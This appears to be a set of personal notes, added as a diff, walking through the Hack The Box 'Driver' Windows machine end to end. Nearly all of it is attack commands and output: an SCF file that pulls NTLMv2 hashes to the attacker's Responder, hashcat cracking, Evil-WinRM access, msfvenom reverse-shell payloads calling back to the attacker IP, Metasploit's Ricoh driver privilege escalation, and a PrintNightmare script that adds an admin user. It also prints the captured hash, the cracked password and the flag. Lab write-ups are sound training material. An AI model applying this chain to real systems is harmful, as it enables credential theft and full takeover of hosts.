@@ -1,0 +1,704 @@
+HTB - Driver - Windows - Printer Exploitation
+
+Creating SCF file - Allow external icons, create one to point to a file server you control.
+Steal ntlmv2 hashes will be provided ... maybe  
+
+Privesc via Print Nightmare or abuse a ricoh driver commonly used in enterprises.  
+
+3 ports open: 80, 135, 445
+Basic realm=MFP Firmware Update Center. Please enter password for admin
+COMMANDS:
+==========================================================================================
+### list shares if possible
+smbclient -L //10.10.11.106
+### No password
+smbclient -L -N //10.10.11.106
+### Null authentication
+smbclient -U '' -L  //10.10.11.106
+==========================================================================================
+
+Using crackmapexec to list a shares
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver/nmap]
+└─$ crackmapexec smb 10.10.11.106
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing SSH protocol database
+[*] Initializing SMB protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing MSSQL protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
+==========================================================================================
+Tells us domain is driver, might be just a standalone. 
+Windows 10 enterprise, signing is false. SMBv1 is set to true. Should be turned off.
+
+Test out http
+Use default creds admin:admin 
+http://10.10.11.106/
+we get the following web page info
+COMMANDS:
+==========================================================================================
+
+MFP Firmware Update Center
+
+    Home (current)
+    About
+    Firmware Updates
+    Drivers Updates
+    Contact
+
+
+   We as a part of centre of excellence, conducts various tests on multi functional printers such as testing firmware updates, drivers etc. 
+==========================================================================================
+
+We can see that the windows machine is running php based on the url
+Their are upload forms attached. 
+COMMANDS:
+==========================================================================================
+http://10.10.11.106/index.php
+http://10.10.11.106/fw_up.php
+==========================================================================================
+
+Will use dirbuster to enumerate the machine for extra hidden directories.
+COMMANDS:
+==========================================================================================
+sudo apt install gobuster -y
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ gobuster dir -u http://10.10.11.106 -U admin -P admin -x php -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
+==========================================================================================
+
+Try to find out how the write to file shares. If you can write to where users print documents
+you can write and SCF file. Allows for external icons, you can have it go back to your 
+computer whenever it wants to pull it and steal ntlmv2 hash. Windows loves single sign on and
+autoauth, smb shares as user likes to login with creds which is the hash. 
+
+Time to create SCF file, we put down our IP addres, will use responder.
+COMMANDS:
+==========================================================================================
+cat attack.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.5\share\test
+[Taskbar]
+Command=ToggleDesktop
+==========================================================================================
+
+Upload the file and using the web interface, before that run responder in order to be able 
+to catch the windows hashes when it uses it to attempt authenticate.
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ sudo responder -I tun0          
+[sudo] password for kali: 
+..
+..
+..
+
+  server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
+[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.106
+[SMB] NTLMv2-SSP Username : DRIVER\tony
+[SMB] NTLMv2-SSP Hash     : tony::DRIVER:086a3997a6862bf7:777A4C23ACCF4EE78D0933C6D7194BF4:010100000000000080007ED2058BD801E900A196FE528378000000000200080054004A004E00510001001E00570049004E002D00510057004B0039004E00540041005300560058004F0004003400570049004E002D00510057004B0039004E00540041005300560058004F002E0054004A004E0051002E004C004F00430041004C000300140054004A004E0051002E004C004F00430041004C000500140054004A004E0051002E004C004F00430041004C000700080080007ED2058BD80106000400020000000800300030000000000000000000000000200000A7BCD9D5C7EFC8ED180B67A4A060FF2D82F3D08CE9DBB51FFC4EC9CF7D34617D0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000    
+...
+..
+..
+..
+==========================================================================================
+
+Remove any trailing white spaces from the has, otherwise hashcat will not be able to read 
+the hash.
+We now have the hash and we can attmept to crack it hashcat.
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ hashcat --force -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+..
+..
+..
+..
+
+TONY::DRIVER:086a3997a6862bf7:777a4c23accf4ee78d0933c6d7194bf4:010100000000000080007ed2058bd801e900a196fe528378000000000200080054004a004e00510001001e00570049004e002d00510057004b0039004e00540041005300560058004f0004003400570049004e002d00510057004b0039004e00540041005300560058004f002e0054004a004e0051002e004c004f00430041004c000300140054004a004e0051002e004c004f00430041004c000500140054004a004e0051002e004c004f00430041004c000700080080007ed2058bd80106000400020000000800300030000000000000000000000000200000a7bcd9d5c7efc8ed180b67a4a060ff2d82f3d08ce9dbb51ffc4ec9cf7d34617d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000:liltony
+
+..
+..
+..
+..
+==========================================================================================
+
+We cracked the hash with hashcat, [ liltony ]
+We can now use crackmapexec along with the credential 
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ crackmapexec smb 10.10.11.106 -u tony -p liltony
+SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
+SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ crackmapexec smb 10.10.11.106 -u tony -p liltony --shares
+SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
+SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
+SMB         10.10.11.106    445    DRIVER           [+] Enumerated shares
+SMB         10.10.11.106    445    DRIVER           Share           Permissions     Remark
+SMB         10.10.11.106    445    DRIVER           -----           -----------     ------
+SMB         10.10.11.106    445    DRIVER           ADMIN$                          Remote Admin                                                                                            
+SMB         10.10.11.106    445    DRIVER           C$                              Default share                                                                                           
+SMB         10.10.11.106    445    DRIVER           IPC$                            Remote IPC
+                                                                                              
+==========================================================================================
+
+Also another thing to check is the winrm ports usually 5985, we can do this with nmap.
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ nmap -sV -p 5985,5986 10.10.11.106
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 16:25 EDT
+Nmap scan report for 10.10.11.106
+Host is up (0.11s latency).
+
+PORT     STATE    SERVICE VERSION
+5985/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5986/tcp filtered wsmans
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
+
+==========================================================================================
+
+Use crackmapexec and see if we can winrrm access to the box
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ crackmapexec winrm 10.10.11.106 -u tony -p liltony     
+SMB         10.10.11.106    5985   NONE             [*] None (name:10.10.11.106) (domain:None)
+HTTP        10.10.11.106    5985   NONE             [*] http://10.10.11.106:5985/wsman
+WINRM       10.10.11.106    5985   NONE             [+] None\tony:liltony (Pwn3d!)
+WINRM       10.10.11.106    5985   NONE             [-] None\tony:liltony "'NoneType' object has no attribute 'upper'"
+==========================================================================================
+
+Looks like we do and we can use a tool like evilwinrm to get access.
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ evil-winrm -i 10.10.11.106 -u tony -p liltony      
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\tony\Documents> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+==========================================================================================
+
+We can even use scripts without entering the box. For the moment we can create scripts and 
+executables we can run once we launch the session with evilwinrm 
+COMMANDS:
+==========================================================================================
+==========================================================================================
+
+We can download the winpeas any binary to run and look for vulnerabilities in the system.
+COMMANDS:
+==========================================================================================
+https://github.com/carlospolop/PEASS-ng/releases/download/20220626/winPEASany.exe
+==========================================================================================
+
+We move the winPEASany.exe binary to the exes directory we created but can't seem to get 
+evilwinrm to detect it. Now we instead move go to the \programdata directory to move the 
+executable and run it from there.
+COMMANDS:
+==========================================================================================
+*Evil-WinRM* PS C:\Users\tony\Documents> cd \programdata
+*Evil-WinRM* PS C:\programdata> upload exes/winPEASany.exe
+Info: Uploading exes/winPEASany.exe to C:\programdata\winPEASany.exe
+==========================================================================================
+
+We can now run the binary from that directory listing.
+COMMANDS:
+==========================================================================================
+*Evil-WinRM* PS C:\programdata> .\winPEASany.exe
+ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+==========================================================================================
+
+A lot of output based on the output, so we will go through it slowly.
+LAPS is not enabled, no AV protection.
+Local account token filter policy set to 1 if set to 0 most likely local accounts can't be
+used remotely.
+
+Intersting drive info which is not good.  
+COMMANDS:
+==========================================================================================
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
+È Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 5 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])       
+==========================================================================================
+
+unquoted service paths, there is space in C program files, we can create files, we need 
+machine to reboot.
+
+Local admin is enabled. Autorun applications. We also find hidden file
+COMMANDS:
+==========================================================================================
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
+                                                                                                    
+     C:\Users\All Users\ntuser.pol
+     C:\Users\All Users\RICOH_DRV
+     C:\Users\Default User
+     C:\Users\Default
+     C:\Users\All Users
+     C:\Users\tony\AppData\Local\Packages\Windows.PurchaseDialog_cw5n1h2txyewy\Windows.PurchaseDialog_6.2.0.0_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG2                    
+     C:\Users\tony\AppData\Local\Packages\Windows.PurchaseDialog_cw5n1h2txyewy\Windows.PurchaseDialog_6.2.0.0_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG1                    
+     C:\Users\tony\AppData\Local\Packages\Windows.ContactSupport_cw5n1h2txyewy\Windows.ContactSupport_10.0.10240.16384_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG2           
+     C:\Users\tony\AppData\Local\Packages\Windows.ContactSupport_cw5n1h2txyewy\Windows.ContactSupport_10.0.10240.16384_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG1           
+     C:\Users\tony\ntuser.pol
+     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23
+     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\do_not_delete_folders
+     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common
+==========================================================================================
+
+Ricoh might be vulnerable.
+An interesting file we take note of comes from the powershell section
+COMMANDS:
+==========================================================================================
+..
+..
+..
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.0.10240.17146
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 134B
+..
+..
+..
+==========================================================================================
+
+We can clearly see there is a cosnole history file, we can download localy and examine the 
+contents.
+COMMANDS:
+==========================================================================================
+*Evil-WinRM* PS C:\programdata> download C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Info: Downloading C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt to ./C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+                                                             
+Info: Download successful!
+
+cat ──(kali㉿kali)-[~/htb/windows/driver]
+└─$ cat C:\\Users\\tony\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 
+Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
+
+ping 1.1.1.1
+ping 1.1.1.1
+==========================================================================================
+
+We can see both the driver name as well as the ricoh version of the driver.
+We can try and find if the ricoh version is vulnerable to attacks.
+
+The gist is that you need admin privs to add a printers driver but you dont need admin privs
+to add an actual printer to the computer. 
+
+The issue with this driver it put all dll files by everyone writeable. Can edit driver for
+printer and add printer and executes what was edited in dll.  
+
+Easiest way to exploit is through metasploit.
+COMMANDS:
+==========================================================================================
+msf6 > search winrm
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank    Check  Description
+   -  ----                                                 ---------------  ----    -----  -----------
+   0  exploit/windows/local/bits_ntlm_token_impersonation  2019-12-06       great   Yes    SYSTEM token impersonation through NTLM bits authentication on missing WinRM Service.
+   1  auxiliary/scanner/winrm/winrm_auth_methods                            normal  No     WinRM Authentication Method Detection                                                            
+   2  auxiliary/scanner/winrm/winrm_cmd                                     normal  No     WinRM Command Runner                                                                             
+   3  auxiliary/scanner/winrm/winrm_login                                   normal  No     WinRM Login Utility                                                                              
+   4  exploit/windows/winrm/winrm_script_exec              2012-11-01       manual  No     WinRM Script Exec Remote Code Execution                                                          
+   5  auxiliary/scanner/winrm/winrm_wql                                     normal  No     WinRM WQL Query Runner                                                                           
+
+
+Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/winrm/winrm_wql                                                                                 
+
+msf6 > use 4
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+msf6 exploit(windows/winrm/winrm_script_exec) > set username tony
+username => tony
+msf6 exploit(windows/winrm/winrm_script_exec) > set password liltony
+password => liltony
+msf6 exploit(windows/winrm/winrm_script_exec) > set rhost 10.10.11.106
+rhost => 10.10.11.106
+msf6 exploit(windows/winrm/winrm_script_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.5:9001 
+[-] Login Failure. Recheck your credentials
+==========================================================================================
+
+The script seems to fail so instead we will use the cmd module 
+
+COMMANDS:
+==========================================================================================
+msf6 exploit(windows/winrm/winrm_script_exec) > use 2
+msf6 auxiliary(scanner/winrm/winrm_cmd) > options
+
+Module options (auxiliary/scanner/winrm/winrm_cmd):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CMD       ipconfig /all    yes       The windows command to run
+   DOMAIN    WORKSTATION      yes       The domain to use for Windows authentification
+   PASSWORD                   yes       The password to authenticate with
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:po
+                                        rt][...]
+   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/me
+                                        tasploit-framework/wiki/Using-Metasploit
+   RPORT     5985             yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   URI       /wsman           yes       The URI of the WinRM service
+   USERNAME                   yes       The username to authenticate as
+   VHOST                      no        HTTP server virtual host
+
+msf6 auxiliary(scanner/winrm/winrm_cmd) > set lport 9001
+lport => 9001
+msf6 auxiliary(scanner/winrm/winrm_cmd) > set lhost tun0
+lhost => tun0
+msf6 auxiliary(scanner/winrm/winrm_cmd) > set rhost 10.10.11.106
+rhost => 10.10.11.106
+msf6 auxiliary(scanner/winrm/winrm_cmd) > set username tony
+username => tony
+msf6 auxiliary(scanner/winrm/winrm_cmd) > set password liltony
+password => liltony
+msf6 auxiliary(scanner/winrm/winrm_cmd) > exploit
+
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DRIVER
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : htb
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-D7-60
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::24e(Preferred)
+   Lease Obtained. . . . . . . . . . : Tuesday, June 28, 2022 5:29:00 PM
+   Lease Expires . . . . . . . . . . : Tuesday, June 28, 2022 10:29:00 PM
+   IPv6 Address. . . . . . . . . . . : dead:beef::ddc1:9ab4:a7f0:62ef(Preferred)
+   Temporary IPv6 Address. . . . . . : dead:beef::74ac:db3:1e6f:f3d5(Preferred)
+   Link-local IPv6 Address . . . . . : fe80::ddc1:9ab4:a7f0:62ef%5(Preferred)
+   IPv4 Address. . . . . . . . . . . : 10.10.11.106(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:9769%5
+                                       10.10.10.2
+   DHCPv6 IAID . . . . . . . . . . . : 50352214
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-4D-55-23-00-50-56-B9-D7-60
+   DNS Servers . . . . . . . . . . . : 1.1.1.1
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+
+Tunnel adapter isatap.{99C52957-7ED3-4943-91B6-CD52EF4D6AFC}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : htb
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+[+] Results saved to /home/kali/.msf4/loot/20220628174416_default_10.10.11.106_winrm.cmd_result_280387.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f exe -o msf.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: msf.exe
+==========================================================================================
+
+Time to use multi handler and set a payload
+COMMANDS:
+==========================================================================================
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set lhost tun0
+lhost => 10.10.14.5
+msf6 exploit(multi/handler) > set lport 9001
+lport => 9001
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.5:9001 
+[*] Sending stage (200774 bytes) to 10.10.11.106
+[*] Meterpreter session 1 opened (10.10.14.5:9001 -> 10.10.11.106:49435) at 2022-06-28 17:52:40 -0400
+
+meterpreter > whoami
+[-] Unknown command: whoami
+meterpreter > getuid
+Server username: DRIVER\tony
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+meterpreter > background
+[*] Backgrounding session 2...
+msf6 exploit(multi/handler) > search ricoh
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank    Check  Description
+   -  ----                                        ---------------  ----    -----  -----------
+   0  exploit/windows/ftp/ricoh_dl_bof            2012-03-01       normal  Yes    Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow
+   1  exploit/windows/local/ricoh_driver_privesc  2020-01-22       normal  Yes    Ricoh Driver Privilege Escalation
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/local/ricoh_driver_privesc   
+
+msf6 exploit(windows/local/ricoh_driver_privesc) > setg payload windows/x64/meterpreter/reverse_tcp
+
+==========================================================================================
+
+payload does not seem to work, may need to set 32 bit payload.
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f exe -o msf32.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: msf32.exe
+
+msf6 exploit(windows/local/ricoh_driver_privesc) > setg payload windows/meterpreter/reverse_tcp
+==========================================================================================
+
+If changing architecutre does not work, go to the meterpreter session and switch into an 
+interactive process.
+
+We will mgrate into explorer
+COMMANDS:
+==========================================================================================
+2212  656   explorer.exe    x64   1        DRIVER\tony  C:\Windows\explorer.exe
+==========================================================================================
+
+That does not work so we try one drive
+COMMANDS:
+==========================================================================================
+2892  3028  OneDrive.exe    x86   1        DRIVER\tony  C:\Users\tony\AppData\Local\Microso
+                                                         ft\OneDrive\OneDrive.exe
+==========================================================================================
+
+We then run the ricoh exploit again using the 64 bit architexture however, it hangs and 
+does not give us a proper session, instead we control C and list the sessions and find that
+the driver session was created
+COMMANDS:
+==========================================================================================
+msf6 exploit(windows/local/ricoh_driver_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.5:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
+[*] Adding printer ZwPvyEF...
+[*] Sending stage (200774 bytes) to 10.10.11.106
+^C[*] Deleting printer ZwPvyEF
+
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/local/ricoh_driver_privesc) > 
+msf6 exploit(windows/local/ricoh_driver_privesc) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  5         meterpreter x86/windows  DRIVER\tony @ DRIVER        10.10.14.5:9001 -> 10.10.11
+                                                                 .106:49444 (10.10.11.106)
+  6         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DRIV  10.10.14.5:4444 -> 10.10.11
+                                     ER                          .106:49445 (10.10.11.106)
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is DB41-39A3
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/12/2021  04:37 AM    <DIR>          .
+06/12/2021  04:37 AM    <DIR>          ..
+06/28/2022  05:29 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   6,139,596,800 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+32998340a3dcfa393fe32a0cfb320eb3
+
+
+==========================================================================================
+
+Could have used print nightmare to privesc as well.
+First do an rpcdump, which dumps all rpc endpoints. 
+If you see [MS-] for the protocol in the output it is generally vulnerable to print nightmare
+
+Google print nightmare powershell.
+https://github.com/calebstewart/CVE-2021-1675
+COMMANDS:
+==========================================================================================
+──(kali㉿kali)-[~/htb/windows/driver]
+└─$ impacket-rpcdump @10.10.11.106
+[*] Retrieving endpoint list from 10.10.11.106
+Protocol: [MS-RSP]: Remote Shutdown Protocol 
+Provider: wininit.exe 
+..
+..
+..
+..
+
+==========================================================================================
+
+Lets put the powershell script for print nightmare in our scripts directory using evilwinrm
+COMMANDS:
+==========================================================================================
+──(kali㉿kali)-[~/htb/windows/driver/scripts]
+└─$ wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+*Evil-WinRM* PS C:\Users\tony\Documents> CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> menu
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+[+] Add-Win32Type 
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] field 
+[+] func 
+[+] get_nightmare_dll 
+[+] Invoke-Binary 
+[+] Invoke-Nightmare 
+[+] New-InMemoryModule 
+[+] psenum 
+[+] struct
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+==========================================================================================
+
+As we can see using the script it adds additional items to the menu one being the 
+invoke-nightmare module which adds a user.
+COMMANDS:
+==========================================================================================
+*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+==========================================================================================
+
+We can now attempt to use psexec to get an administrative shell.
+COMMANDS:
+==========================================================================================
+┌──(kali㉿kali)-[~/htb/windows/driver]
+└─$ impacket-psexec adm1n@10.10.11.106
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.11.106.....
+[*] Found writable share ADMIN$
+[*] Uploading file XwpHGDyC.exe
+[*] Opening SVCManager on 10.10.11.106.....
+[*] Creating service ZaNJ on 10.10.11.106.....
+[*] Starting service ZaNJ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.10240]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+==========================================================================================
+
+COMMANDS:
+==========================================================================================
+==========================================================================================
+
